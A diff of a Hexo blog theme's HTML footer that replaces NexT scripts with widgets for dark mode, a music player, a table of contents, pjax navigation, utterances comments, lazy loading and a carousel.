+      
+    </div>
   </div>
 
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
 
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark" onclick="toggleDarkMode()">
+  <div class="dark-content">
+    <i class="fas" id="darkIcon" aria-hidden="true"></i>
+  </div>
+</div>
+
+<script defer>
+  $(function() {
+    // 初始化暗黑模式状态
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    updateDarkModeIcon(isDark);
+  });
+
+  function toggleDarkMode() {
+    const isDark = $(document.body).hasClass('darkModel');
+    $(document.body).toggleClass('darkModel');
+    localStorage.setItem('dark', !isDark);
+    updateDarkModeIcon(!isDark);
+  }
+
+  function updateDarkModeIcon(isDark) {
+    const iconElement = document.getElementById('darkIcon');
+    if (isDark) {
+      iconElement.classList.remove('fa-moon');
+      iconElement.classList.add('fa-lightbulb');
+    } else {
+      iconElement.classList.remove('fa-lightbulb');
+      iconElement.classList.add('fa-moon');
+    }
+  }
+</script>
+
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script defer src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script async>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
 
   
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+        <script type="text/javascript">
+  var utteranceComment = {};
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceComment.Theme = 'github-dark';
+    } else {
+      utteranceComment.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceComment.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceComment.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+      
 
 
-
-
-
-
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
 
   
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script async src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script async src="/js/cursor/explosion.min.js"></script>
+  
 
 
 
 
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
 
-</body>
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
 </html>
